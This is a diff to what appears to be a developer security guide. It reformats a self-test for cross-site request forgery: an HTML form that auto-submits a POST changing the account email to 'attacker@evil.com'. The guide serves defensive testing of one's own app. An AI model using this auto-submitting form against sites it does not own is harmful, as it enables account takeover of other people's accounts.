@@ -113,9 +113,11 @@ Create this HTML file and open it in a browser where you're logged into your app
 
 ```html
 <form action="https://yourapp.com/api/change-email" method="POST">
-  <input name="email" value="attacker@evil.com">
+	<input name="email" value="attacker@evil.com" />
 </form>
-<script>document.forms[0].submit()</script>
+<script>
+	document.forms[0].submit();
+</script>
 ```
 
 Replace the URL with any state-changing endpoint in your app.
